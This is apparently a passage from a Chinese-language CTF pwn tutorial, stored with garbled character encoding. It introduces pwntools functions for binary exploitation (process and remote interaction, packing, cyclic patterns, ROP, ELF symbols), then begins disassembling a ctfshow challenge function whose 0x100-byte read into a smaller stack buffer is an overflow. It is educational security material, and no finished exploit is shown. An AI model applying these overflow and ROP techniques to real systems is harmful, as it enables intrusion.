&lt;p&gt;&lt;code&gt;from pwn import *&lt;/code&gt; æ˜¯åœ¨ Python ä¸­ä½¿ç”¨ &lt;code&gt;pwntools&lt;/code&gt; åº“çš„å¸¸è§å¯¼å…¥æ–¹å¼ ã€‚&lt;code&gt;pwntools&lt;/code&gt; æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ç”¨äºäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ï¼ˆbinary exploitationï¼‰çš„ Python åº“ï¼Œåœ¨ CTFï¼ˆCapture The Flagï¼Œå¤ºæ——èµ› ï¼‰ç«èµ›ã€å®‰å…¨ç ”ç©¶ä»¥åŠæ¼æ´åˆ†æç­‰é¢†åŸŸå¹¿æ³›åº”ç”¨ï¼Œä»¥ä¸‹æ˜¯å…¶å…·ä½“ä½œç”¨ï¼š&lt;/p&gt;
&lt;h4 id=&#34;ä¸ç›®æ ‡ç¨‹åºäº¤äº’&#34;&gt;ä¸ç›®æ ‡ç¨‹åºäº¤äº’
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;æœ¬åœ°è¿›ç¨‹äº¤äº’&lt;/strong&gt;ï¼š&lt;code&gt;pwntools&lt;/code&gt; èƒ½è½»æ¾åˆ›å»ºæœ¬åœ°è¿›ç¨‹ï¼Œæ¨¡æ‹Ÿç”¨æˆ·è¾“å…¥ã€è·å–ç¨‹åºè¾“å‡ºã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;p = process(&#39;./vulnerable_program&#39;)&lt;/code&gt; å¯ä»¥å¯åŠ¨æœ¬åœ°çš„å¯æ‰§è¡Œæ–‡ä»¶ &lt;code&gt;vulnerable_program&lt;/code&gt;ï¼Œç„¶åé€šè¿‡ &lt;code&gt;p.sendline(&#39;input data&#39;)&lt;/code&gt; å‘ç¨‹åºå‘é€æ•°æ®ï¼Œç”¨ &lt;code&gt;p.recvuntil(&#39;prompt&#39;)&lt;/code&gt; æ¥æ”¶ç¨‹åºè¾“å‡ºç›´åˆ°é‡åˆ°ç‰¹å®šå­—ç¬¦ä¸²ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è¿œç¨‹æœåŠ¡å™¨äº¤äº’&lt;/strong&gt;ï¼šåœ¨é¢å¯¹è¿œç¨‹å­˜åœ¨æ¼æ´çš„æœåŠ¡æ—¶ï¼Œ&lt;code&gt;pwntools&lt;/code&gt; æä¾›äº†ä¾¿æ·çš„æ–¹æ³•ã€‚æ¯”å¦‚ &lt;code&gt;r = remote(&#39;target.com&#39;, 8080)&lt;/code&gt; å¯ä»¥è¿æ¥åˆ° &lt;code&gt;target.com&lt;/code&gt; æœåŠ¡å™¨çš„ 8080 ç«¯å£ï¼Œåç»­åŒæ ·èƒ½å‘é€å’Œæ¥æ”¶æ•°æ®ï¼Œæ–¹ä¾¿å¯¹è¿œç¨‹æœåŠ¡è¿›è¡Œæµ‹è¯•å’Œæ¼æ´åˆ©ç”¨ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;äºŒè¿›åˆ¶æ•°æ®å¤„ç†&#34;&gt;äºŒè¿›åˆ¶æ•°æ®å¤„ç†
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;æ•°æ®æ‰“åŒ…å’Œè§£åŒ…&lt;/strong&gt;ï¼šåœ¨äºŒè¿›åˆ¶ç¨‹åºä¸­ï¼Œç»å¸¸éœ€è¦å¤„ç†ä¸åŒå­—èŠ‚åºï¼ˆå¤§ç«¯åºã€å°ç«¯åºï¼‰çš„æ•°æ®ã€‚&lt;code&gt;pwntools&lt;/code&gt; æä¾›äº† &lt;code&gt;pack&lt;/code&gt; å’Œ &lt;code&gt;unpack&lt;/code&gt; å‡½æ•°ï¼Œæ¯”å¦‚ &lt;code&gt;p32(0x12345678)&lt;/code&gt; å¯ä»¥å°†æ•´æ•° &lt;code&gt;0x12345678&lt;/code&gt; æŒ‰ç…§å°ç«¯åºæ‰“åŒ…æˆ 4 å­—èŠ‚çš„äºŒè¿›åˆ¶æ•°æ®ï¼›&lt;code&gt;u32(data)&lt;/code&gt; åˆ™å¯ä»¥å°† 4 å­—èŠ‚çš„äºŒè¿›åˆ¶æ•°æ®æŒ‰ç…§å°ç«¯åºè§£åŒ…ä¸ºæ•´æ•°ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ•°æ®è½¬æ¢&lt;/strong&gt;ï¼šå®ƒè¿˜æ”¯æŒå„ç§æ•°æ®æ ¼å¼ä¹‹é—´çš„è½¬æ¢ï¼Œå¦‚å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚ä¸²ï¼Œæˆ–è€…è¿›è¡Œåå…­è¿›åˆ¶ä¸äºŒè¿›åˆ¶æ•°æ®ä¹‹é—´çš„è½¬æ¢ç­‰ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;è¾…åŠ©æ¼æ´åˆ©ç”¨&#34;&gt;è¾…åŠ©æ¼æ´åˆ©ç”¨
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ç”Ÿæˆ Payload&lt;/strong&gt;ï¼šå¯¹äºç¼“å†²åŒºæº¢å‡ºç­‰æ¼æ´ï¼Œéœ€è¦ç²¾å¿ƒæ„é€  Payloadï¼ˆæ”»å‡»è½½è·ï¼‰ã€‚&lt;code&gt;pwntools&lt;/code&gt; æä¾›äº†ç”Ÿæˆå¡«å……æ•°æ®ã€æ„é€  ROPï¼ˆReturn-Oriented Programmingï¼Œè¿”å›å¯¼å‘ç¼–ç¨‹ ï¼‰é“¾ç­‰åŠŸèƒ½ã€‚æ¯”å¦‚ &lt;code&gt;cyclic(100)&lt;/code&gt; å¯ä»¥ç”Ÿæˆä¸€ä¸ª 100 å­—èŠ‚çš„å¾ªç¯æ¨¡å¼å­—ç¬¦ä¸²ï¼Œç”¨äºç¡®å®šç¼“å†²åŒºæº¢å‡ºçš„åç§»é‡ï¼›é€šè¿‡ &lt;code&gt;ROP&lt;/code&gt; æ¨¡å—å¯ä»¥æ–¹ä¾¿åœ°æ„å»º ROP é“¾æ¥ç»•è¿‡ä¸€äº›å®‰å…¨æœºåˆ¶ï¼Œå®ç°ä»£ç æ‰§è¡Œã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç¬¦å·è§£æ&lt;/strong&gt;ï¼šåœ¨åˆ†æäºŒè¿›åˆ¶ç¨‹åºæ—¶ï¼Œæœ‰æ—¶éœ€è¦è§£æç¨‹åºä¸­çš„å‡½æ•°åœ°å€ã€å˜é‡åœ°å€ç­‰ã€‚&lt;code&gt;pwntools&lt;/code&gt; å¯ä»¥ä¸ &lt;code&gt;ELF&lt;/code&gt;ï¼ˆExecutable and Linkable Formatï¼Œå¯æ‰§è¡Œä¸å¯é“¾æ¥æ ¼å¼ï¼Œå¸¸ç”¨äº Linux ç³»ç»Ÿä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ã€å…±äº«åº“ç­‰ ï¼‰æ–‡ä»¶äº¤äº’ï¼Œè·å–è¿™äº›ç¬¦å·ä¿¡æ¯ï¼Œä¾‹å¦‚ &lt;code&gt;elf = ELF(&#39;./target_binary&#39;)&lt;/code&gt; å¯ä»¥åŠ è½½ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ &lt;code&gt;elf.symbols[&#39;main&#39;]&lt;/code&gt; è·å– &lt;code&gt;main&lt;/code&gt; å‡½æ•°çš„åœ°å€ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;å¯†ç å­¦ç›¸å…³è¾…åŠ©&#34;&gt;å¯†ç å­¦ç›¸å…³è¾…åŠ©
&lt;/h4&gt;&lt;p&gt;åœ¨ CTF ä¸­ï¼Œæœ‰æ—¶ä¼šæ¶‰åŠå¯†ç å­¦é¢˜ç›®ï¼Œ&lt;code&gt;pwntools&lt;/code&gt; ä¹Ÿæä¾›äº†ä¸€äº›åŸºç¡€çš„å¯†ç å­¦è¾…åŠ©åŠŸèƒ½ï¼Œæ¯”å¦‚å¸¸è§åŠ å¯†ç®—æ³•çš„ç®€å•å®ç°ã€ç¼–ç è§£ç ç­‰ã€‚&lt;/p&gt;
&lt;h4 id=&#34;å¤šçº¿ç¨‹å’Œå¼‚æ­¥æ”¯æŒ&#34;&gt;å¤šçº¿ç¨‹å’Œå¼‚æ­¥æ”¯æŒ
&lt;/h4&gt;&lt;p&gt;&lt;code&gt;pwntools&lt;/code&gt; ä¸€å®šç¨‹åº¦ä¸Šæ”¯æŒå¤šçº¿ç¨‹å’Œå¼‚æ­¥æ“ä½œï¼Œè¿™åœ¨åŒæ—¶ä¸å¤šä¸ªç›®æ ‡ç¨‹åºäº¤äº’ï¼Œæˆ–è€…éœ€è¦åœ¨ç­‰å¾…ç¨‹åºè¾“å‡ºçš„åŒæ—¶æ‰§è¡Œå…¶ä»–ä»»åŠ¡æ—¶éå¸¸æœ‰ç”¨ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;æ‰€ä»¥ä¸ºå•¥è¦å­¦&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/python/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Python&lt;/a&gt;ï¼Œå½“ç„¶èƒ½ç”¨&lt;a class=&#34;link&#34; href=&#34;https://www.doubao.com/chat/?from_logout=1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;è±†åŒ…&lt;/a&gt;ã€&lt;a class=&#34;link&#34; href=&#34;https://www.deepseek.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;DeepSeek&lt;/a&gt;ä¹‹ç±»çš„AIå¸®ä½ å†™ä»£ç expï¼Œä½†ä½ å¾—å…ˆäº†è§£&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/python/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Python&lt;/a&gt;å†è®©å®ƒå†™æ‰å¯¹çš„ï¼Œæœ‰æ—¶ä¼šå‡ºé”™ï¼Œä½ å¾—æœ‰åˆ¤æ–­åŠ›ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™é‡Œæ¨èä½¿ç”¨Pycharmã€Visual Studio Codeï¼›æˆ–è€…ä½ å¯ä»¥åœ¨Kaliä¸Šç”¨ç»ˆç«¯æ¥è¿è¡Œï¼Œè¿™æ ·ä½ åœ¨Kaliç”¨ncè¿æ¥é¶æœºæ—¶åœ¨åŒä¸€ç³»ç»Ÿè¿è¡Œäº¤äº’æ¯”è¾ƒæ–¹ä¾¿ï¼Œå½“ç„¶Pycharmã€Visual Studio Codeä¹Ÿæœ‰ç»ˆç«¯åŠŸèƒ½ï¼Œåªä¸è¿‡è¦é…PWNç¯å¢ƒç¨å¾®éº»çƒ¦è€Œå·²ï¼Œçœ‹ä½ ä¹ ä¸ä¹ æƒ¯ç”¨Linuxç³»ç»Ÿå§ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;h4 id=&#34;é¢˜ç›®åç»­&#34;&gt;é¢˜ç›®åç»­ï¼š
&lt;/h4&gt;&lt;p&gt;è®²å¾—æ¯”è¾ƒå•°å—¦ï¼Œè¿™é‡Œå¼€å§‹åˆ†æè¿™æ®µæ±‡ç¼–ä»£ç ï¼ˆé‡æ–°ç²˜è´´äº†ä¸€éï¼Œå’Œä¸Šé¢ä¸€æ ·ï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; =============== S U B R O U T I N E =======================================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; Attributes: bp-based frame&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; int __cdecl ctfshow(_DWORD)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ctfshow&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ctfshow&lt;/span&gt;         &lt;span class=&#34;nv&#34;&gt;proc&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;near&lt;/span&gt;               &lt;span class=&#34;c1&#34;&gt;; CODE XREF: main+132â†“p&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;             &lt;span class=&#34;err&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;88h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;var_4&lt;/span&gt;           &lt;span class=&#34;err&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;dword&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; __unwind {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C7&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C9&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;CA&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;sub&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;84h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;D0&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;__x86_get_pc_thunk_bx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;D5&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;_GLOBAL_OFFSET_TABLE_&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;DB&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;sub&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;DE&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;mh&#34;&gt;100h&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;; nbytes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E3&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E9&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;; buf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;EA&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;               &lt;span class=&#34;c1&#34;&gt;; fd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;EC&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;_read&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F1&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;10h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F4&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;sub&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0Ch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F7&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
